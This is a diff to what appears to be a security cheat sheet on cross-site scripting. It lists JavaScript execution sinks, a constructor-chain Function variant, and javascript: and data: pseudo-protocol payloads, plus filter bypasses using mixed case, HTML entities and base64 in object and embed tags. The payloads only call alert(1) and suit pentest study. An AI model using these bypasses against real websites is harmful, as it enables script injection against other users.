@@ -42,3 +42,26 @@ setInterval("JSCode") //all browsers
 setImmediate("JSCode") //IE 10+
 Function("JSCode") //all browsers
 ```
+An interesting variation of the Function sink is:
+```javascript
+	[].constructor.constructor(alert(1))
+    ^        ^          ^         ^
+  object   array     Function   XSS Vector
+```
+## Pseudo-Protocols
+Unofficial URI schemes, such as `javascript:` is commonly referred to as a pseudo-protocol. This specific pseudo-protocol is used to invoke JavaScript code within a link.
+> Note: `javascript:` is not needed on event handlers, so we should avoid using it.
+
+Typically the keyword `javascript:` is also commonly blocked, the following are some examples to bypass this:
+- `object data="JaVaScRiPt:alert(1)">`
+- `object data="javascript&colon;alert(1)">`
+- `<object data="javascript&#x003A;alert(1)">`
+- `<object data="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;alert(1)">`
+
+Additionally, there is also `data:`. For example:
+- `<object data="data:text/html,<script>alert(1)</script>">`
+- `<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">`
+
+If `data:` is blocked, the following is an example of a bypass:
+- `<embed code="DaTa:text/html,<script>alert(1)</script>">`
+- `<embed code="data&#x003A;text/html,<script>alert(1)</script>">`
